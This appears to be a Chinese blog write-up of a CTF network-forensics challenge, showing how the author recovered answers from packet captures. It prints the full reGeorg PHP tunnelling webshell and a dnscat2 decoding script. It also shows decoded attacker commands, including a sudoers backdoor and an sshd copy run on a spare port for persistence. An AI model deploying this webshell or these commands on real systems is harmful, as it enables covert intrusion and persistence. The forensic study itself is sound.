---
title: "铁三杯十三赛区流量分析部分题目 WriteUp"
date: 2018-05-26 22:48:59
tags: [writeup, audit]
---

为什么说部分呢, 因为有些题目忘记截图了 `_(:з」∠)_`, 所以只有 8-14 题的 writeup, 好在之前的题目都比较常规, 刚好从第8题开始有难度. 所以直接从 0x08 开始吧. 顺便把数据包也上传了, 链接: [https://pan.baidu.com/s/17ne-6R_yTCYEknRnJwu2EA](https://pan.baidu.com/s/17ne-6R_yTCYEknRnJwu2EA) 提取密码: vi2e 解压密码 t3sec.org.cn

### 0x08 黑客在第二个目标机上添加的用户名和密码是什么

这个得从之前的包说起, 有个 model.php, 长这样

<!-- more -->

```php
<?php
/*                   _____                                    
   ____   ______  __|___  |__  ______  _____  _____   ______  
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
 |__|__\|______||______|  __||______|_____/|__|__\|______| 
                    |_____|
                    ... every office needs a tool like Georg
                    
  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad

Legal Disclaimer
Usage of reGeorg for attacking networks without consent
can be considered as illegal activity. The authors of
reGeorg assume no liability or responsibility for any
misuse or damage caused by this program.

If you find reGeorge on one of your servers you should
consider the server compromised and likely further compromise
to exist within your internal network.

For more information, see:
https://github.com/sensepost/reGeorg
*/

ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("Georg says, 'All seems fine'");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd = $headers["X-CMD"];
    switch($cmd){
		case "CONNECT":
			{
				$target = $headers["X-TARGET"];
				$port = (int)$headers["X-PORT"];
				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				if ($sock === false) 
				{	
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed creating socket');
					return;
				}
				$res = @socket_connect($sock, $target, $port);
                if ($res === false) 
				{ 
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed connecting to target');
					return;
				}
				socket_set_nonblock($sock);	
				@session_start();
				$_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();            
				session_write_close();
                
				while ($_SESSION["run"])
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();
                    if ($writeBuff != "")
					{
						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
						if($i === false)
						{ 
							@session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
							header('X-ERROR: Failed writing socket');
						}
					}
					while ($o = socket_read($sock, 512)) {
					if($o === false)
						{ 
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed reading from socket');
						}
						$readBuff .= $o;
					}
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;
                        session_write_close();
                    }
                    #sleep(0.2);
				}
                socket_close($sock);
			}
			break;
		case "DISCONNECT":
			{
                error_log("DISCONNECT recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
		case "READ":
			{
				@session_start();
				$readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["run"];
				session_write_close();
                if ($running) {
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
					return;
				}
			}
			break;
		case "FORWARD":
			{
                @session_start();
                $running = $_SESSION["run"];
				session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= $rawPostData;
					session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					return;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
	}
}
?>
```

大概看了一哈, CONNECT 就是开启一个 socket, FORWARD 就是往 socket 里面写数据, READ、DISCONNECT 自然就是读数据和断开链接. 在 `data2_challage_00004_20180227145305` 里面可以看到 CONNECT 了 `192.168.1.30` 的 `7001` 端口, 7001 是 webLogic 的端口, 之前出过一个洞, 这时估计攻击者是想用这个洞拿 shell, 由于这些包是包括 `192.168.1.30` 的流量的, 所以我们之间取这台被攻击机的流量就行了. 可以用 `tshark` 提取, 翻了一下前面都是对我们来说没用的拿 shell 的过程, 重要的是最后的 pwd 和 ifconfig, 这样就可以秒掉之前的两道题(当前目录和 MAC 地址), 再将 `data2_challage_00005_201802271501121.pcap` 也提取一下, 就可以拿到添加的用户名和密码, 就是 `mailer:test`.

### 0x09 目标 2 的后台的用户名和密码是多少

这个挺简单, 在 `data2_challage_00007_20180227151621` 里面, 直接过滤 http 就行, 得到 `webadmin:web_pass`

### 0x0A 黑客什么时候上传了后门程序包

观察 `data2_challage_00008_20180227152407` , 可以看到 index 就是马, 所以 `data2_challage_00007_20180227151621` 里面上传的 `index.war` 就是马的压缩文件, 把这个包的上传时间提交上去就行. 得到 `15:23:49.475745`, 注意删掉后面的 3 个零, 真的有毒.

### 0x0B 目标 2 上 webshell 的后台密码

同第 9 题, 挺简单, 在 `data2_challage_00008_20180227152407` 里面, 得到 `admin`

### 0x0C 在目标 1 上的 /tmp/fun 文件的内容是什么

从这道题开始我真的无力吐槽 _(:з」∠)_, 因为跳的真的太快. 虽然在第 9~13 数据包里面确实可以看到有上传 `dnscat` 这种 dns 隧道, 但是真的很难想到这就要用上, 毕竟从 14~15 里面才有 dns 通讯的痕迹, 我还以为在前面有漏掉的内容 (逃 导致卡了蛮久的. 在这直接跳了 5 个数据包可还行, 至少加个题目问下 dns 隧道用了什么软件嘛 233. 不说这个了, 回到题目, 可以在 github 查到 dnscat 协议的结构, 以及有人做的分析, [https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md),

```
(uint16_t) packet_id
(uint8_t) message_type [0x01]
(uint16_t) session_id
(uint16_t) seq
(uint16_t) ack
(byte[]) data
```

4 + 2 + 4 + 4 + 4 = 18, 所以我们从第 19 位开始取就行了, 先用 tshark 将 dns.qry.name 全部取出来, 然后写个小脚本提取一下就行.

```python
import base64

data = open("temp").read().split("\n")
result = open("result", "wb")
s = set()

for line in data:
    s.add(line)

for line in s:
    if line and line.find("dnscat") != -1:
        line = line[7:].replace(".", "") #删掉 dnscat 和 .
        line = line[18:].upper() #取得有效位
        line = base64.b16decode(line) #还原成二进制
        f2.write(line)
```

从 `data2_challage_00014_20180227162610.pcap` 提取的全是乱码, 并没有什么用, 最后 3 题都在 `data2_challage_00015_20180227165116`, `hexdump` 后就可以看到最后三题的答案了.

```
00000000  63 6f 6d 6d 61 6e 64 20  28 6c 6f 63 61 6c 68 6f  |command (localho|
00000010  73 74 2e 6c 6f 63 61 6c  64 6f 6d 61 69 6e 29 00  |st.localdomain).|
00000020  6c 6e 20 2d 73 66 20 2f  75 73 72 2f 73 62 69 6e  |ln -sf /usr/sbin|
00000030  2f 73 73 68 64 20 2f 74  6d 70 2f 63 68 73 68 3b  |/sshd /tmp/chsh;|
00000040  20 2f 74 6d 70 2f 63 68  73 68 20 2d 6f 50 6f 72  | /tmp/chsh -oPor|
00000050  74 3d 37 37 37 37 20 28  6c 6f 63 61 6c 68 6f 73  |t=7777 (localhos|
00000060  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 0a  |t.localdomain)..|
00000070  0c 10 eb ff 0e 46 2a be  32 2d 94 2d 4a 80 a5 b9  |.....F*.2-.-J...|
00000080  1f b5 69 ee 85 52 e3 3e  2a 27 c1 8a 98 98 ac 72  |..i..R.>*'.....r|
00000090  da fe b6 aa 21 20 10 01  b9 fb ad 58 45 2e d6 60  |....! .....XE..`|
000000a0  ed e3 cd da 22 36 20 ce  13 83 e7 8d d2 f8 d9 33  |...."6 ........3|
000000b0  3a c9 04 c7 ef bc cd 54  01 46 bc 5b d0 1a 47 85  |:......T.F.[..G.|
000000c0  f0 83 5e b5 31 c1 0f 1b  3b 55 66 c2 c3 4d e1 72  |..^.1...;Uf..M.r|
000000d0  0b 46 59 28 b9 93 9b c0  a9 54 66 01 2b 71 e4 cb  |.FY(.....Tf.+q..|
000000e0  f5 4a 53 df f6 a2 7d 32  08 ca f9 ea 98 c9 16 6c  |.JS...}2.......l|
000000f0  6e 20 2d 73 66 20 2f 75  73 72 2f 73 62 69 6e 2f  |n -sf /usr/sbin/|
00000100  73 73 68 64 20 2f 74 6d  70 2f 63 68 73 68 3b 20  |sshd /tmp/chsh; |
00000110  2f 74 6d 70 2f 63 68 73  68 20 2d 6f 50 6f 72 74  |/tmp/chsh -oPort|
00000120  3d 36 36 36 36 3b 20 28  6c 6f 63 61 6c 68 6f 73  |=6666; (localhos|
00000130  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 00  |t.localdomain)..|
00000140  00 00 06 80 01 00 01 fb  1b 00 00 00 06 80 01 00  |................|
00000150  02 96 dd 65 63 68 6f 20  27 6d 61 69 6c 65 72 20  |...echo 'mailer |
00000160  20 20 20 41 4c 4c 3d 28  41 4c 4c 29 20 20 20 20  |   ALL=(ALL)    |
00000170  41 4c 4c 27 20 20 3e 3e  20 20 2f 65 74 63 2f 73  |ALL'  >>  /etc/s|
00000180  75 64 6f 65 72 73 20 28  6c 6f 63 61 6c 68 6f 73  |udoers (localhos|
00000190  74 2e 6c 6f 63 61 6c 64  6f 6d 61 69 6e 29 00 00  |t.localdomain)..|
000001a0  00 00 06 80 01 00 02 4c  f2 2f 65 74 63 2f 73 73  |.......L./etc/ss|
000001b0  68 2f 73 73 68 64 5f 63  6f 6e 66 69 67 3a 20 50  |h/sshd_config: P|
000001c0  65 72 6d 69 73 73 69 6f  6e 20 64 65 6e 69 65 64  |ermission denied|
000001d0  0a a7 07 00 03 d4 db f5  93 63 6f 6d 6d 61 6e 64  |.........command|
000001e0  20 28 6c 6f 63 61 6c 68  6f 73 74 2e 6c 6f 63 61  | (localhost.loca|
000001f0  6c 64 6f 6d 61 69 6e 29  00 63 6f 6d 6d 61 6e 64  |ldomain).command|
00000200  20 28 6c 6f 63 61 6c 68  6f 73 74 2e 6c 6f 63 61  | (localhost.loca|
00000210  6c 64 6f 6d 61 69 6e 29  00 00 00 00 06 80 02 00  |ldomain)........|
00000220  02 f3 9c 26 0a 00 04 71  1a b7 28 63 6f 6d 6d 61  |...&...q..(comma|
00000230  6e 64 20 28 6c 6f 63 61  6c 68 6f 73 74 2e 6c 6f  |nd (localhost.lo|
00000240  63 61 6c 64 6f 6d 61 69  6e 29 00 63 6f 6d 6d 61  |caldomain).comma|
00000250  6e 64 20 28 6c 6f 63 61  6c 68 6f 73 74 2e 6c 6f  |nd (localhost.lo|
00000260  63 61 6c 64 6f 6d 61 69  6e 29 00 61 6d 20 63 6c  |caldomain).am cl|
00000270  6f 73 65 64 00 70 c3 00  00 c4 d2 dd 06 ab ba 87  |osed.p..........|
00000280  31 e4 a2 01 cc 5b 8e a2  d9 fc 65 02 76 f9 ce 10  |1....[....e.v...|
00000290  d2 37 a7 4d 1d 0a 3e 1c  78 36 63 72 cc 33 3a c9  |.7.M..>.x6cr.3:.|
000002a0  04 c7 ef bc cd 54 01 46  bc 5b d0 1a 47 85 f0 83  |.....T.F.[..G...|
000002b0  5e b5 31 c1 0f 1b 3b 55  66 c2 c3 4d e1 72 0b 46  |^.1...;Uf..M.r.F|
000002c0  59 28 b9 93 9b c0 a9 54  66 01 2b 71 e4 cb f5 4a  |Y(.....Tf.+q...J|
000002d0  53 df f6 a2 7d 32 08 ca  f9 ea 98 c9 16 64 e0 00  |S...}2.......d..|
000002e0  02 74 2e f7 10 00 00 00  06 80 01 00 02 05 d0 65  |.t.............e|
000002f0  63 68 6f 20 68 65 6c 6c  6f 77 6f 72 6c 64 20 3e  |cho helloworld >|
00000300  20 2f 74 6d 70 2f 66 75  6e 20 28 63 6c 6f 75 64  | /tmp/fun (cloud|
00000310  65 29 00 63 6f 6d 6d 61  6e 64 20 28 6c 6f 63 61  |e).command (loca|
00000320  6c 68 6f 73 74 2e 6c 6f  63 61 6c 64 6f 6d 61 69  |lhost.localdomai|
00000330  6e 29 00 9a 4a 00 01 de  7b a2 29 73 68 20 28 6c  |n)..J...{.)sh (l|
00000340  6f 63 61 6c 68 6f 73 74  2e 6c 6f 63 61 6c 64 6f  |ocalhost.localdo|
00000350  6d 61 69 6e 29 00 0a 0c  10 eb ff 0e 46 2a be 32  |main).......F*.2|
00000360  2d 94 2d 4a 80 a5 b9 1f  b5 69 ee 85 52 e3 3e 2a  |-.-J.....i..R.>*|
00000370  27 c1 8a 98 98 ac 72 da  fe b6 aa 21 20 10 01 b9  |'.....r....! ...|
00000380  fb ad 58 45 2e d6 60 ed  e3 cd da 22 36 20 ce 13  |..XE..`...."6 ..|
00000390  83 e7 8d d2 f8 d9                                 |......|
```

可以看到 `echo helloworld > /tmp/fun`, `helloworld` 即是第 12 题答案.

### 0x0D 黑客什么时候将目标 2 上添加的用户加入到 sudo 组中

`echo 'mailer ALL=(ALL) ALL' >> /etc/sudoers` 就是了, 重新换成 16 进制, 数据包里面搜一下就可以得到时间 `17:19:24.285557`, 注意这里要用攻击机回应的 dns 包的时间.

### 0x0E 在目标 2 上黑客执行某命令开启了一个端口作为后门, 这条命令是什么

很明显就是这个 `ln -sf /usr/sbin/sshd /tmp/chsh; /tmp/chsh -oPort=7777`, 但这建了个软链, 该用 `sshd` 呢还是 `chsh` 还是 `/usr/bin/sshd` 啥的带绝对路径的, 以及要不要带 `-oPort=7777` 这个参数呢 (甚至后面还有个 `-oPort=6666`), 后来小丢小姐姐提示直接一起复制上去就行了, 这个时候想起来有 `;` , 严格意义上来说这确实是`一`条命令.... 我的表情是这样的  
![](https://i.loli.net/2019/03/08/5c8276282a140.jpeg)  
这就完成了全部题目, 题目还是蛮不错的, 至少还得自己写点程序, 不是只靠脚本就能完成, 就是中间突然跳了太多了...(碎碎念